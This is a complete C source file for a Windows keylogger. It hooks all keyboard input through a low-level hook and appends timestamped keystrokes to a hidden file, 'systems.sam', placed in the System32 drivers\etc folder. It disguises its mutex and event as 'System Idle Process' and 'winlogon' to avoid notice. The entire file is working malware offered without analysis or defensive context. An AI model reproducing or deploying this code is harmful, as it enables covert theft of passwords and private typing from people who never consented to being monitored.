
#include <windows.h>
#include <stdio.h>

FILE* logFile;
char bufferForKeys[100];

BYTE keyState[256];
WCHAR buffer[16];
SYSTEMTIME sysTime;

HANDLE singleInstanceMutexHandle;
HHOOK keyboardHookHandle;
HANDLE quitEventHandle;

void LogToFile( char* data )
{
    fputs( data, logFile );
    fflush( logFile );
}

LRESULT CALLBACK KeyboardHookDelegate( int nCode, WPARAM wParam, LPARAM lParam )
{
    PKBDLLHOOKSTRUCT keyboardDllHookStruct = (PKBDLLHOOKSTRUCT) (lParam);
    
    if( wParam == WM_KEYDOWN )
    {
        GetSystemTime( &sysTime );
        GetKeyboardState((PBYTE)&keyState);
        ToUnicode( keyboardDllHookStruct->vkCode, keyboardDllHookStruct->scanCode, (PBYTE)&keyState, (LPWSTR)&buffer, sizeof(buffer) / 2, 0);
        sprintf( bufferForKeys, "%d/%d/%d/%d/%d/%d : %X\t\t : %c\n", sysTime.wYear, sysTime.wMonth, sysTime.wDay, 
                                                                     sysTime.wHour, sysTime.wMinute, sysTime.wSecond, 
                                                                     buffer[0], buffer[0] );   
        LogToFile( bufferForKeys );     
    }

    return CallNextHookEx( NULL, nCode, wParam, lParam );
}

DWORD WINAPI ThreadedCode( LPVOID )
{
    WaitForSingleObject( quitEventHandle, INFINITE );
    
    CloseHandle( singleInstanceMutexHandle );
    CloseHandle( quitEventHandle );
    UnhookWindowsHookEx( keyboardHookHandle );
    fclose( logFile );
    
    ExitProcess( 0 );
    
    return 0;
}

int WINAPI WinMain( HINSTANCE currentInstance, HINSTANCE previousInstance, LPSTR commandLine, int showMode )
{
    const char singleInstanceMutexName[] = "System Idle Process";
    const char quitEventName[] = "winlogon";
    
    singleInstanceMutexHandle = CreateMutex( NULL, TRUE, singleInstanceMutexName );
    int isAlreadyRunning = GetLastError() == ERROR_ALREADY_EXISTS;
        
    if( !isAlreadyRunning )
    {
        char windowsPath[MAX_PATH] = { 0 };
        GetWindowsDirectory( windowsPath, MAX_PATH );
        
        char logFilePath[MAX_PATH] = { 0 };
        sprintf( logFilePath, "%s\\System32\\drivers\\etc\\systems.sam", windowsPath );
        
        logFile = fopen( logFilePath, "a" );
        keyboardHookHandle = SetWindowsHookEx( WH_KEYBOARD_LL, KeyboardHookDelegate, currentInstance, 0 );
        {
            quitEventHandle = CreateEvent( NULL, FALSE, FALSE, quitEventName );
            
            int threadId;
            CreateThread( NULL, 0, ThreadedCode, 0, 0, &threadId );
            
            MSG message;
            while( GetMessage( &message, NULL, 0, 0 ) )
            {}
        }
    }
    else
    {
        quitEventHandle = OpenEvent( EVENT_ALL_ACCESS, FALSE, quitEventName );
        SetEvent( quitEventHandle );
    }

    return 0;
}
